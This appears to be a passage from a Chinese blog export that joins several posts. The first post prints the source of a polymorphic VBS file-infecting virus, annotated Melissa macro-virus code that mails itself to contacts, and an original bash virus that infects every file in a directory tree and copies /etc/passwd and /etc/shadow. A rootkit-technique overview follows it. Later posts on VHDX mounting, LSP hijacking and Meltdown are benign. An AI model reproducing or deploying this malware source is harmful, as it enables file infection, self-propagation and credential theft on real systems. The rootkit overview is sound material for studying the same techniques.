Mid(CurrentString,LastIndexChar+1,Len(CurrentString)-LastIndexChar-1) CurrentString = KJChangeSub(CurrentString,LastIndexChar) SubE = 1 Else ' 如果存在子目录 ' 如果SubE为0，则将CurrentString变为它的第1个子目录 If SubE = 0 Then CurrentString = CurrentString \u0026 DicSub.Item(1) \u0026 \"\\\" Exit Do Else ' 如果SubE为1，继续遍历子目录，并将下一个子目录返回 j = 0 For j = 1 To FolderCount If LCase(SubString) = LCase(DicSub.Item(j)) Then If j \u003c FolderCount Then CurrentString = CurrentString \u0026 DicSub.Item(j+1) \u0026 \"\\\" Exit Do End If End If Next LastIndexChar = InstrRev(CurrentString,\"\\\",Len(CurrentString)-1) SubString = Mid(CurrentString,LastIndexChar+1,Len(CurrentString)-LastIndexChar-1) CurrentString = KJChangeSub(CurrentString,LastIndexChar) End If End If Loop KJOboSub = CurrentString End Function ' 函数：KJPropagate() ' 功能：病毒传播 Function KJPropagate() On Error Resume Next RegPathvalue = \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Outlook Express\\Degree\" DiskDegree = WsShell.RegRead(RegPathvalue) ' 如果不存在Degree这个键值，DiskDegree则为FinalyDisk盘 If DiskDegree = \"\" Then DiskDegree = FinalyDisk \u0026 \":\\\" End If ' 继DiskDegree置后感染5个目录 For i=1 to 5 DiskDegree = KJOboSub(DiskDegree) KJummageFolder(DiskDegree) Next ' 将感染记录保存在\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Outlook Express\\Degree\"键值中 WsShell.RegWrite RegPathvalue,DiskDegree End Function ' 函数：KJummageFolder(PathName) ' 功能：感染指定目录 ' 参数： ' PathName 指定目录 Function KJummageFolder(PathName) On Error Resume Next ' 取得目录中的所有文件集 Set FolderName = FSO.GetFolder(PathName) Set ThisFiles = FolderName.Files HttExists = 0 For Each ThisFile In ThisFiles FileExt = UCase(FSO.GetExtensionName(ThisFile.Path)) ' 判断扩展名 ' 若是HTM,HTML,ASP,PHP,JSP则向文件中追加HTML版的病毒体 ' 若是VBS则向文件中追加VBS版的病毒体 ' 若是HTT,则标志为已经存在HTT了 If FileExt = \"HTM\" Or FileExt = \"HTML\" Or FileExt = \"ASP\" Or FileExt = \"PHP\" Or FileExt = \"JSP\" Then Call KJAppendTo(ThisFile.Path,\"html\") ElseIf FileExt = \"VBS\" Then Call KJAppendTo(ThisFile.Path,\"vbs\") ElseIf FileExt = \"HTT\" Then HttExists = 1 End If Next ' 如果所给的路径是桌面，则标志为已经存在HTT了 If (UCase(PathName) = UCase(WinPath \u0026 \"Desktop\\\")) Or (UCase(PathName) = UCase(WinPath \u0026 \"Desktop\"))Then HttExists = 1 End If ' 如果不存在HTT ' 向目录中追加病毒体 If HttExists = 0 Then FSO.CopyFile WinPath \u0026 \"system32\\desktop.ini\",PathName FSO.CopyFile WinPath \u0026 \"web\\Folder.htt\",PathName End If End Function ' 函数KJSetDim() ' 定义FSO,WsShell对象 ' 取得最后一个可用磁盘卷标 ' 生成传染用的加密字串 ' 备份系统中的web\\folder.htt和system32\\desktop.ini Function KJSetDim() On Error Resume Next Err.Clear ' 测试当前执行文件是html还是vbs TestIt = WScript.ScriptFullname If Err Then InWhere = \"html\" Else InWhere = \"vbs\" End If ' 创建文件访问对象和Shell对象 If InWhere = \"vbs\" Then Set FSO = CreateObject(\"Scripting.FileSystemObject\") Set WsShell = CreateObject(\"WScript.Shell\") Else Set AppleObject = document.applets(\"KJ_guest\") AppleObject.setCLSID(\"{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}\") AppleObject.createInstance() Set WsShell = AppleObject.GetObject() AppleObject.setCLSID(\"{0D43FE01-F093-11CF-8940-00A0C9054228}\") AppleObject.createInstance() Set FSO = AppleObject.GetObject() End If Set DiskObject = FSO.Drives ' 判断磁盘类型 ' ' 0: Unknown ' 1: Removable ' 2: Fixed ' 3: Network ' 4: CD-ROM ' 5: RAM Disk ' 如果不是可移动磁盘或者固定磁盘就跳出循环。可能作者考虑的是网络磁盘、CD-ROM、RAM Disk都是在比较靠后的位置。呵呵，如果C:是RAMDISK会怎么样？ For Each DiskTemp In DiskObject If DiskTemp.DriveType \u003c\u003e 2 And DiskTemp.DriveType \u003c\u003e 1 Then Exit For End If FinalyDisk = DiskTemp.DriveLetter Next ' 此前的这段病毒体已经解密，并且存放在ThisText中，现在为了传播，需要对它进行再加密。 ' 加密算法 Dim OtherArr(3) Randomize ' 随机生成4个算子 For i=0 To 3 OtherArr(i) = Int((9 * Rnd)) Next TempString = \"\" For i=1 To Len(ThisText) TempNum = Asc(Mid(ThisText,i,1)) '对回车、换行(0x0D,0x0A)做特别的处理 If TempNum = 13 Then TempNum = 28 ElseIf TempNum = 10 Then TempNum = 29 End If '很简单的加密处理，每个字符减去相应的算子，那么在解密的时候只要按照这个顺序每个字符加上相应的算子就可以了。 TempChar = Chr(TempNum - OtherArr(i Mod 4)) If TempChar = Chr(34) Then TempChar = Chr(18) End If TempString = TempString \u0026 TempChar Next ' 含有解密算法的字串 UnLockStr = \"Execute(\"\"Dim KeyArr(3),ThisText\"\"\u0026vbCrLf\u0026\"\"KeyArr(0) = \" \u0026 OtherArr(0) \u0026 \"\"\"\u0026vbCrLf\u0026\"\"KeyArr(1) = \" \u0026 OtherArr(1) \u0026 \"\"\"\u0026vbCrLf\u0026\"\"KeyArr(2) = \" \u0026 OtherArr(2) \u0026 \"\"\"\u0026vbCrLf\u0026\"\"KeyArr(3) = \" \u0026 OtherArr(3) \u0026 \"\"\"\u0026vbCrLf\u0026\"\"For i=1 To Len(ExeString)\"\"\u0026vbCrLf\u0026\"\"TempNum = Asc(Mid(ExeString,i,1))\"\"\u0026vbCrLf\u0026\"\"If TempNum = 18 Then\"\"\u0026vbCrLf\u0026\"\"TempNum = 34\"\"\u0026vbCrLf\u0026\"\"End If\"\"\u0026vbCrLf\u0026\"\"TempChar = Chr(TempNum + KeyArr(i Mod 4))\"\"\u0026vbCrLf\u0026\"\"If TempChar = Chr(28) Then\"\"\u0026vbCrLf\u0026\"\"TempChar = vbCr\"\"\u0026vbCrLf\u0026\"\"ElseIf TempChar = Chr(29) Then\"\"\u0026vbCrLf\u0026\"\"TempChar = vbLf\"\"\u0026vbCrLf\u0026\"\"End If\"\"\u0026vbCrLf\u0026\"\"ThisText = ThisText \u0026 TempChar\"\"\u0026vbCrLf\u0026\"\"Next\"\")\" \u0026 vbCrLf \u0026 \"Execute(ThisText)\" ' 将加密好的病毒体复制给变量 ThisText ThisText = \"ExeString = \"\"\" \u0026 TempString \u0026 \"\"\"\" ' 生成html感染用的脚本 HtmlText =\"\u003c\" \u0026 \"script language=vbscript\u003e\" \u0026 vbCrLf \u0026 \"document.write \" \u0026 \"\"\"\" \u0026 \"\u003c\" \u0026 \"div style='position:absolute; left:0px; top:0px; width:0px; height:0px; z-index:28; visibility: hidden'\u003e\" \u0026 \"\u003c\"\"\u0026\"\"\" \u0026 \"APPLET NAME=KJ\"\"\u0026\"\"_guest HEIGHT=0 WIDTH=0 code=com.ms.\"\"\u0026\"\"activeX.Active\"\"\u0026\"\"XComponent\u003e\" \u0026 \"\u003c\" \u0026 \"/APPLET\u003e\" \u0026 \"\u003c\" \u0026 \"/div\u003e\"\"\" \u0026 vbCrLf \u0026 \"\u003c\" \u0026 \"/script\u003e\" \u0026 vbCrLf \u0026 \"\u003c\" \u0026 \"script language=vbscript\u003e\" \u0026 vbCrLf \u0026 ThisText \u0026 vbCrLf \u0026 UnLockStr \u0026 vbCrLf \u0026 \"\u003c\" \u0026 \"/script\u003e\" \u0026 vbCrLf \u0026 \"\u003c\" \u0026 \"/BODY\u003e\" \u0026 vbCrLf \u0026 \"\u003c\" \u0026 \"/HTML\u003e\" ' 生成vbs感染用的脚本 VbsText = ThisText \u0026 vbCrLf \u0026 UnLockStr \u0026 vbCrLf \u0026 \"KJ_start()\" ' 取得Windows目录 ' GetSpecialFolder(n) ' 0: WindowsFolder ' 1: SystemFolder ' 2: TemporaryFolder ' 如果系统目录存在web\\Folder.htt和system32\\desktop.ini，则用kjwall.gif文件名备份它们。 WinPath = FSO.GetSpecialFolder(0) \u0026 \"\\\" If (FSO.FileExists(WinPath \u0026 \"web\\Folder.htt\")) Then FSO.CopyFile WinPath \u0026 \"web\\Folder.htt\",WinPath \u0026 \"web\\kjwall.gif\" End If If (FSO.FileExists(WinPath \u0026 \"system32\\desktop.ini\")) Then FSO.CopyFile WinPath \u0026 \"system32\\desktop.ini\",WinPath \u0026 \"system32\\kjwall.gif\" End If End Function ----------------------- 这个病毒是用VBS编写的多变形、加密病毒，感染扩展名为.html, .htm, .asp, .php, .jsp, .htt和.vbs文件，同时该病毒会大量生成folder.htt和desktop.ini，并在%windir%\\System\\中生成一个名字叫Kernel.dll的文件（Windows 9x/Me）或Kernel32.dll（Windows NT/2000），修改.dll文件的打开方式，感染Outlook的信纸文件。 （注：%windir%指的是Windows的目录， 对于Win9x/Me系统来说，这个目录通常是\\Windows，对于Windows NT/2000来说，这个目录通常是\\WinNT；特别注意：这两个Kernel文件生成的路径都是%windir%\\System\\，而不是%windir%\\System32\\） 感染这个病毒后有两个明显的表现：\n  在每个目录中都会生成folder.htt（带毒文件）和desktop.ini（目录配置文件）；\n  电脑运行速度明显变慢，在任务列表中可以看到有大量的Wscript.exe程序在运行。\n  梅利莎病毒  梅丽莎病毒-百度百科\n梅丽莎病毒-wiki\nMelissa分析\nMelissa病毒分析-ppt\nmelissa.macro.virus.txt\n 梅丽莎病毒属于word宏病毒，主要通过电脑邮件传播，主要利用了人类的好奇心——这是给你的资料，不要让任何人看见，更有意思的是，这个病毒的名字来源于作者在佛罗里达州遇到过的一个脱衣女郎的名字XD\n梅丽莎病毒一般通过邮件传播，邮件的标题通常为“这是给你的资料，不要让任何人看见”。一旦收件人打开病毒邮件，病毒就会自动向用户通讯录的前50位好友复制发送同样的邮件。\n 手工清除办法：\n 删除所有的normal.dot文件，注意隐藏文件和系统文件中的搜索 打开注册表管理器，搜索所有名称为Melissa的项，全部删除 删除所有染毒的word   Word宏，本质上是一个批量处理程序命令，微软用其提高工作效率\n宏其实就是一段vbscript代码，当word运行时自动运行宏代码，经过实验，word宏在删除带有宏的word文件之后或者禁用宏功能之后，仍然可以在新建word时自动运行宏，更别说是一个病毒宏的传播了，其自动运行，难以删除的特性，使得Melissa病毒有着重大影响力\n 现在的word可以在：审阅 ➡ 宏中创建新的宏\n在文件 ➡ 信任中心 ➡ 信任中心设置 ➡ 宏设置 中可以打开是否启用宏\n 病毒源码如下：\n'Part1 ' Private Sub Document_Open() On Error Resume Next '读取Windows Registry，即注册表 '如果是word2000就把Security设置为最低 '若不是则把word的转化确认、病毒保护、模板存储确认设置成off '然后把菜单项Tools-\u003eMacro Disable ,这样达到隐藏代码的效果 If System.PrivateProfileString(\"\", \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\9.0\\Word\\Security\", \"Level\") \u003c\u003e \"\" Then CommandBars(\"Macro\").Controls(\"Security...\").Enabled = False System.PrivateProfileString(\"\", \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\9.0\\Word\\Security\", \"Level\") = 1\u0026 Else CommandBars(\"Tools\").Controls(\"Macro\").Enabled = False Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1) End If 'Part2 'Melissa病毒Payload主体 '先判断是否已经感染 '感染的标记在注册表里 '若无感染则写一个主题为Important Message From $name Here is that document you asked for ... don't show anyone else ;-)的邮件，以及附有病毒word(即本文件)发送到地址簿上的前50个人 '然后再注册表中标记已感染 Dim UngaDasOutlook, DasMapiName, BreakUmOffASlice Set UngaDasOutlook = CreateObject(\"Outlook.Application\") Set DasMapiName = UngaDasOutlook.GetNameSpace(\"MAPI\") If System.PrivateProfileString(\"\", \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\\", \"Melissa?\") \u003c\u003e \"... by Kwyjibo\" Then If UngaDasOutlook = \"Inlook\" Then DasMapName.Logon \"profile\", \"password\" For y = 1 To DasMapName.AddressLists.Count Set AddyBook = DasMapiName.AddressLists(y) Set BreakOffASlice = UngaDasOutlook.CreateItem(0) For oo = 1 To AddyBook.AddressEntries.Count Peep = AddyBook.AddressEntries(x) BreakOffASlice.Recipients.Add Peep x++ If x \u003c 50 Then oo = AddyBook.AddressEntries.Count Next oo BreakOffASlice.Subject = \"Important Message From \" \u0026 Application.UserName BreakUmOffASlice.Body = \"Here is that document you asked for ... don't show anyone else ;-)\" *** Here is the classic subject line \"Important Message From\" This could change of course in future versions *** BreakUmOffASlice.Attachments.Add ActiveDocument.FullName BreakUmOffASlice.Send Peep = \"\" Next y DasMapName.Logoff End If System.PrivateProfileString(\"\", \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\\", \"Melissa?\") = \"... by Kwyjibo\" End If 'Part3 '病毒自我复制部分 '根据情况对Active Document或Normal Template进行感染 ' Set ADI1 = ActiveDocument.VBProject.VBComponents.Item(1) Set NTI1 = NormalTemplate.VBProject.VBComponents.Item(1) NTCL = NTI1.CodeModule.CountOfLines ADCL = ADI1.CodeModule.CountOfLines BGN = 2 If ADI1.Name \u003c\u003e \"Melissa\" Then If ADCL \u003e 0 Then _ ADI1.CodeModule.DeleteLines 1, ADCL Set ToInfect = ADI1 ADI1.Name = \"Melissa\" DoAD = True End If If NTI1.Name \u003c\u003e \"Melissa\" Then If NTCL \u003e 0 Then _ NTI1.CodeModule.DeleteLines 1, NTCL Set ToInfect = NTI1 NTI1.Name = \"Melissa\" DoNT = True End If If DoNT \u003c\u003e True And DoAD \u003c\u003e True Then GoTo END If DoNT = True Then Do While ADI1.CodeModule.Lines(1, 1) = \"\" ADI1.CodeModule.DeleteLines 1 Loop ToInfect.CodeModule.AddFromString (\"Private Sub Document_Close()\") Do While ADI1.CodeModule.Lines(BGN, 1) \u003c\u003e \"\" ToInfect.CodeModule.InsertLines BGN, ADI1.CodeModule.Lines(BGN, 1) BGN = BGN + 1 Loop End If If DoAD = True Then Do While NTI1.CodeModule.Lines(1, 1) = \"\" NTI1.CodeModule.DeleteLines 1 Loop ToInfect.CodeModule.AddFromString (\"Private Sub Document_Open()\") Do While NTI1.CodeModule.Lines(BGN, 1) \u003c\u003e \"\" ToInfect.CodeModule.InsertLines BGN, NTI1.CodeModule.Lines(END, 1) BGN = BGN + 1 Loop End If CYA: If NTCL \u003c\u003e 0 And ADCL = 0 And (InStr(1, ActiveDocument.Name, \"Document\") = False) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName ElseIf (InStr(1, ActiveDocument.Name, \"Document\") \u003c\u003e False) Then ActiveDocument.Saved = True End If 'Part4 '假如午时已到，告诉感染者你已经被感染23333333333 ' 'WORD/Melissa written by Kwyjibo 'Works in both Word 2000 and Word 97 'Worm? Macro Virus? Word 97 Virus? Word 2000 Virus? You Decide! 'Word -\u003e Email | Word 97 \u003c--\u003e Word 2000 ... it's a new age! If Day(Now) = Minute(Now) Then Selection.TypeText \" Twenty-two points, plus triple-word-score, plus fifty points for using all my letters. Game's over. I'm outta here.\" End Sub 写一个bash病毒 附：现shell脚本：https://www.runoob.com/linux/linux-shell.html\n 注意变量赋值之间没有空格，踩坑踩了很久才发现\n 实现了感染目录下将自身复制到每个文件里，并记录感染文件至.bak/filelist_log\n并获取信息到.bak/info目录下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58  #!/bin/bash #MagicFuck whoami=\"$(whoami)\" path=\"$(pwd)\" file_list=$(ls $path) echo -e \"$whoamiin $pathfucking your file\\n\" touch /tmp/v_tmp tmp='/tmp/v_tmp' cat \"$path/$0\" \u003e $tmp # backup mkdir .bak cp -r * .bak mkdir $path/.bak/info touch $path/.bak/info/filelist_log cat /proc/meminfo \u003e\u003e $path/.bak/info/meminfo cat /proc/cpuinfo \u003e\u003e $path/.bak/info/cpuinfo cat /etc/hostname \u003e\u003e $path/.bak/info/hostname cat /etc/passwd \u003e\u003e $path/.bak/info/passwd if test $whoami = 'root'; then touch $path/.bak/info/shadow cat /etc/shadow \u003e\u003e $path/.bak/info/shadow fi function fuckfile(){ file_list=$(ls $pwd) echo $(ls $pwd) \u003e\u003e $path/.bak/filelist_log for file_ in $(ls $pwd); do # echo $file_ if test -d $file_ then echo \"$file_is dir\" if $(cat $file_ |grep -q \".bak\") then echo \"It's Magic bak\" else cd ./$file_ fuckfile cd .. fi else if $(cat $file_ |grep -q \"MagicFuck\") then echo \"It has Magic\" else cat $tmp \u003e\u003e $file_ fi fi done } fuckfile rm $tmp   通过劫持hook实现键盘记录器：https://blog.csdn.net/simon798/article/details/98848050\n二进制文件病毒：binary file virus  该病毒以寄生方式挂接到二进制可执行文件（不管该文件能否直接执行）。二进制可执行文件包含可由 CPU 直接解释的二进制指令。这些类型的病毒通常称为文件感染型病毒。\nELF病毒原理 每个可执行文件都有一个控制流，即执行路径，而elf病毒的首要目标是劫持控制流，暂时改变程序的执行路径来执行寄生代码。 寄生代码通常负责设置钩子来劫持函数，还会将自身代码复制到没有感染病毒的程序中。一旦寄生代码执行完成，就会跳到原始的入口点或正常的执行路径上，这样就使得病毒不容易被发现。 另外，一个真正的ELF病毒应该具有下面的特点：\n 能感染可执行文件 寄生代码必须是独立的，能够在物理上寄存与另一个程序内部，不能依赖动态链接器链接外部的库。独立于其他文件、代码库、程序等。 被感染的宿主文件能继续执行并传播病毒   About ELF病毒：\nELF病毒分析\n自己动手写病毒—ELF文件病毒\n《linux二进制分析》读书笔记总结--ELF病毒技术-linux/unix病毒\n【技术分享】如何使用汇编语言编写一个病毒\n Rootkit  Reference:\nRootkit-wiki\nhttp://read.pudn.com/downloads83/doc/319249/%E5%86%85%E6%A0%B8%E7%BA%A7%E5%90%8E%E9%97%A8Rootkit%E6%8A%80%E6%9C%AF.pdf\n【技术分享】Rootkit技术入门：从syscall到hook！\n rootkit的主要分类：  应用级 内核级 硬件级  早期的rootkit主要为应用级rootkit，应用级rootkit主要通过替换login、ps、ls、netstat等系统工具，或修改.rhosts等系统配置文件等实现隐藏及后门；硬件级rootkit主要指bios rootkit，可以在系统加载前获得控制权，通过向磁盘中写入文件，再由引导程序加载该文件重新获得控制权，也可以采用虚拟机技术，使整个操作系统运行在rootkit掌握之中；目前最常见的rootkit是内核级rootkit。\n内核级rootkit又可分为lkm rootkit、非lkm rootkit。lkm rootkit主要基于lkm技术，通过系统提供的接口加载到内核空间，成为内核的一部分，进而通过hook系统调用等技术实现隐藏、后门功能。非lkm rootkit主要是指在系统不支持lkm机制时修改内核的一种方法，主要通过/dev/mem、/dev/kmem设备直接操作内存，从而对内核进行修改。\n linux lkm rootkit常用技巧\nLKM：Loadable Kernel Modules，内核模块动态加载技术，insmod、lsmod等可直接对内核模块进行操作\n可动态更改是指允许内核在运行时动态地向其中插入或从中删除代码。这些代码包括相关的子例程、数据、函数入口和函数出口被一并组合在一个单独的二进制镜像中，即所谓的可装载内核模块中，或被简称为模块。\n 非lkm rootkit要实现对内核的修改，首先需要获得内核空间的内存，因此需要调用kmalloc分配内存，而kmalloc是内核空间的调用，无法在用户空间直接调用该函数，因此想到了通过int 0x80调用该函数的方法。先选择一个不常见的系统调用号，在sys_call_table中找到该项，通过写/dev/mem直接将其修改为 kmalloc函数的地址，这样当我们在用户空间调用该系统调用时，就能通过int 0x80进入内核空间，执行kmalloc函数分配内存，并将分配好的内存地址由eax寄存器返回，从而我们得到了一块属于内核地址空间的内存，接着将要 hack的函数写入该内存，并再次修改系统调用表，就能实现hook系统调用的功能。\nrootkit的常见功能 隐藏文件：通过strace ls可以发现ls命令其实是通过sys_getdents64获得文件目录的，因此可以通过修改sys_getdents64系统调用或者更底层的 readdir实现隐藏文件及目录，还有对ext2文件系统直接进行修改的方法，不过实现起来不够方便，也有一些具体的限制。\n隐藏进程：隐藏进程的方法和隐藏文件类似，ps命令是通过读取/proc文件系统下的进程目录获得进程信息的，只要能够隐藏/proc文件系统下的进程目录就可以达到隐藏进程的效果，即hook sys_getdents64和readdir等。\n隐藏连接：netstat命令是通过读取/proc文件系统下的net/tcp和net/udp文件获得当前连接信息，因此可以通过hook sys_read调用实现隐藏连接，也可以修改tcp4_seq_show和udp4_seq_show等函数实现。\n隐藏模块：lsmod命令主要是通过sys_query_module系统调用获得模块信息，可以通过hook sys_query_module系统调用隐藏模块，也可以通过将模块从内核模块链表中摘除从而达到隐藏效果。\n嗅探工具：嗅探工具可以通过libpcap库直接访问链路层，截获数据包，也可以通过linux的netfilter框架在IP层的hook点上截获数据包。嗅探器要获得网络上的其他数据包需要将网卡设置为混杂模式，这是通过ioctl系统调用的SIOCSIFFLAGS命令实现的，查看网卡的当前模式是通过SIOCGIFFLAGS命令，因此可以通过hook sys_ioctl隐藏网卡的混杂模式。\n密码记录：密码记录可以通过hook sys_read系统调用实现，比如通过判断当前运行的进程名或者当前终端是否关闭回显，可以获取用户的输入密码。hook sys_read还可以实现login后门等其它功能。\n日志擦除：传统的unix日志主要在/var/log/messages，/var/log/lastlog，/var/run/utmp，/var /log/wtmp下，可以通过编写相应的工具对日志文件进行修改，还可以将HISTFILE等环境变设为/dev/null隐藏用户的一些操作信息。\n内核后门：可以是本地的提权后门和网络的监听后门，本地的提权可以通过对内核模块发送定制命令实现，网络内核后门可以在IP层对进入主机的数据包进行监听，发现匹配的指定数据包后立刻启动回连进程。\nrootkit的主要技术 lkm注射、模块摘除、拦截中断（0x80、0x01）、劫持系统调用、运行时补丁、inline hook、端口反弹……\nlkm注射：也是一种隐藏内核模块的方法，通过感染系统的lkm，在不影响原有功能的情况下将rootkit模块链接到系统lkm中，在模块运行时获得控制权，初始化后调用系统lkm的初始化函数，lkm注射涉及到elf文件格式与模块加载机制。\n模块摘除：主要是指将模块从模块链表中摘除从而隐藏模块的方法，最新加载的模块总是在模块链表的表头，因此可以在加载完rootkit模块后再加载一个清除模块将rootkit模块信息从链表中删除，再退出清除模块，新版本内核中也可以通过判断模块信息后直接list_del。\n拦截中断：主要通过sidt指令获得中断调用表的地址，进而获取中断处理程序的入口地址，修改对应的中断处理程序，如int 0x80，int 0x1等。其中拦截int 0x1是较新的技术，主要利用系统的调试机制，通过设置DR寄存器在要拦截的内存地址上下断点，从而在执行到指定指令时转入0x1中断的处理程序，通过修改0x1中断的处理程序即可实现想要的功能。\n劫持系统调用：和拦截中断类似，但主要是对系统调用表进行修改，可以直接替换原系统调用表，也可以修改系统调用表的入口地址。在2.4内核之前，内核的系统调用表地址是导出的，因此可以直接对其进行修改。但在2.6内核之后，系统调用表的地址已经不再导出，需要对0x80中断处理程序进行分析从而获取系统调用表的地址。\n运行时补丁：字符设备驱动程序和块设备驱动程序在加载时都会向系统注册一个Struct file_operations结构实现指定的read、write等操作，文件系统也是如此，通过修改文件系统的file_operations结构，可以实现新的read、write操作等。\ninline hook：主要是指对内存中的内核函数直接修改，而不影响原先的功能，可以采用跳转的办法，也可以修改对下层函数的call offset实现。\n端口反弹：主要是为了更好的突破防火墙的限制，可以在客户端上监听80端口，而在服务器端通过对客户端的80端口进行回连，伪装成一个访问web服务的正常进程从而突破防火墙的限制。\n","description":"","tags":["virus","reverse"],"title":"Computer-Virus","uri":"/posts/computer-virus/"},{"categories":[],"content":"Virtual Hard Disk 一直很好奇老师用的.vhdx是啥，知道他发来了一个.vhdx文件格式的东西我才开始了解\n 资料：\nvhdx-wiki\nUnderstanding and Working with VHD(X) Files\nwindows的虚拟磁盘（vhd，vhdx）使用\nlinux 挂在vhdx的方法\nlinux下挂载VHD等虚拟磁盘文件\n vhd是一种虚拟硬盘的文件格式，他可以包含能在物理HDD上找到的内容，比如磁盘分区和文件系统，也可以包含文件夹和文件，通常用作虚拟机的硬盘，而vhdx是第二代的vhd，在性能上也有所不同\n vhdx在windows 8和windows server 2012之后被支持 vhd的容量限制为2040GB，而vhdx最多为64TB vhdx可防止电源故障，并由hyper-V使用  功能有：\n 在vhd和主机文件系统之间移动文件 备份与还原 防病毒和安全性 图像管理和修补 磁盘转换：物理到虚拟，虚拟到物理 生命周期管理和重新配置  VHDX模拟硬盘，与文件系统的格式无关，也与分区无关。vhdx具有与物理硬盘驱动器相同的特征。假如创建一个ntfs格式的vhdx就如上图所示\n老师给的vhdx使用攻略 由于我的硬盘快炸了就不实验这个了\n下载vhdx文件，放到一个妥帖的地方备份先。 一个有空闲80G以上的硬盘比如E:，解压缩vhdx放到e:下 “以管理员身份”运行“命令提示符”，执行： bcdedit /copy {current} -d \"windows 10 x64 v2004 20h1 b19041\" 会返回一个uuid，像这样子： {78088406-4d9e-11e9-951e-97df5fa30904} 然后继续执行（注意uuid换成你返回的）（注意把E换成你的盘符，大括号中括号要保持不要删） bcdedit /set {78088406-4d9e-11e9-951e-97df5fa30904} osdevice vhd=[e:]\\Windows10x64-v2004-20h1-b19041.vhdx bcdedit /set {78088406-4d9e-11e9-951e-97df5fa30904} device vhd=[e:]\\Windows10x64-v2004-20h1-b19041.vhdx bcdedit /set {78088406-4d9e-11e9-951e-97df5fa30904} hypervisorlaunchtype OFF 然后重开机，注意有个开机选择菜单， 选这个v2004即可进入新的windows 不选或直接回车的话，会继续旧的windows。 将来如果想删掉，直接把vhdx删掉就完事了。 附 $ md5sum W* 52cd80b26541bb92e306291362a930cb *Windows10x64-v2004-20h1-b19041.7z fc99df570f50bd7b4cfd0b08a905a11e *Windows10x64-v2004-20h1-b19041.vhdx windows下使用 windows下可以用磁盘管理去创建或附加\n右键开始菜单或者win+R运行diskmgmt.msc命令，打开磁盘管理工具\n选择一个硬盘，在菜单中点击操作，创建VHD即可\n卸载 去磁盘管理工具，点击对硬盘，分离vhd\nLinux下使用 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41  # file:install_tools.sh # install qemu utils sudo apt install qemu-utils # install nbd client sudo apt install nbd-client #------------------------------------ #file:mount_vhdx.sh #!/bin/bash VHDX_IMG=\"$1\" MOUNT_POINT=\"$2\" # [ubuntu] How do you mount a VHD image # https://ubuntuforums.org/showthread.php?t=2299701 #  # Load the nbd kernel module. sudo rmmod nbd;sudo modprobe nbd max_part=16 # mount block device sudo qemu-nbd -c /dev/nbd0 \"$VHDX_IMG\" # reload partition table sudo partprobe /dev/nbd0 # mount partition sudo mount -o rw,nouser /dev/nbd0p1 \"$MOUNT_POINT\" #----------------------------------------- #file:unmount_vhdx.sh #!/bin/bash MOUNT_POINT=\"$1\" #unmount \u0026 remove nbd module sudo umount \"$MOUNT_POINT\" \u0026\u0026 sudo qemu-nbd -d /dev/nbd0 \u0026\u0026 sudo rmmod nbd   ","description":"something about vhdx\u0026vhd","tags":[],"title":"Virtual_hard_disk","uri":"/posts/virtual_hard_disk/"},{"categories":["network"],"content":"序 原本只是想白嫖免费的腾讯加速器，用完卸了，没想到还卸载不了。\n其中有两个dll删除时总是显示正在运行中，用tasklist /m xxx.dll查看运行dll的进程，一一终止，然后把他删了。\n然后发现，我网络炸了？？？\nssr也被加速器顺便给炸了，显示绑定了另外一个端口\n 参考：\n分层服务提供程序\nLSP-wiki\nLSP劫持与网络数据转发代理服务器的心得笔记\n Winsock LSP全称Windows Socket Layered Service Provider(分层服务提供商)，它是Windows底层网络Socker通信需要经过的大门。一些流氓软件可以把自已加进去，就可以截取、访问、修改网络的数据包，可以随意添加广告，还能获取你的浏览习惯.如果加进的是木马，后果可想而知。而且因为LSP工作在底层，所以无论你用什么浏览器，都逃不了经过它。而LSP中的dll文件被删除后，就会出现无法上网的情况。\nWinsock LSP 可用于非常广泛的实用用途，包括 Internet 家长控制 (parental control) 和 Web 内容筛选。在以前版本的 Windows XP 中，删除不正确的（也称为“buggy”）LSP 可能会导致注册表中的 Winsock 目录损坏，潜在的导致所有网络连接的丢失。 LSP就是TCP/IP等协议的接口．LSP用在正途上可以方便程序员们编写监视系统网络通讯情况的Sniffer，可是现在常见的LSP都被用于浏览器劫持。\n现在大多加速器，尤其以腾讯系为主的大多应用（腾讯加速器，TGP(现wegame)，都是以lsp劫持到自己的节点进行加速\n非正常卸载(比如强行删除加速器文件)通常会带来无法上网的问题。\n 如何编写lsp劫持：\nhttps://blog.csdn.net/Aaron133/article/details/78028942\nhttps://www.cnblogs.com/freesec/p/6541725.html\nhttps://www.cnblogs.com/hjbf/p/10195244.html\nhttps://blog.csdn.net/sspdfn/article/details/86520816\n windows10 解决办法\n1  $ netsh winsock reset   PS：用ping检查网络状况\n1 2 3 4 5  ping 127.0.0.1(判断本地tcp/ip协议是否正常)， #ping 本地ip (判断网卡是否正常)， ping gateway_ip # 网关(判断路由器是否正常)， ping 14.215.177.39 # 外网ip，百度的ip (判断网络连接是否正常),  ping baidu.com # 外网域名(判断DNS是否正常)，   ","description":"","tags":[],"title":"lsp-hijack","uri":"/posts/lsp-hijack/"},{"categories":["hardware","security","cpu"],"content":"0x00 序 由于新型冠状病毒，美股多次熔断，我们的安全课也提到了熔断一词：Meltdown，将其与硬件安全联系在了一起\nMeltdown，源自于2018年1月3日的两组CPU芯片漏洞之一\n 2018年1月3日，Google Project Zero（GPZ）团队安全研究员Jann Horn在其团队博客中爆出CPU芯片的两组漏洞，分别是Meltdown与Spectre。\n Meltdown对应CVE-2017-5754（乱序执行缓存污染），Spectre对应CVE-2017-5753（边界检查绕过）与CVE-2017-5715（分支目标注入）。看CVE编号就能知道，这两组漏洞早在2017年6月就已经由GPZ团队向英特尔提交，而在差不多时间由Lipp等人发布的论文Meltdown与Spectre 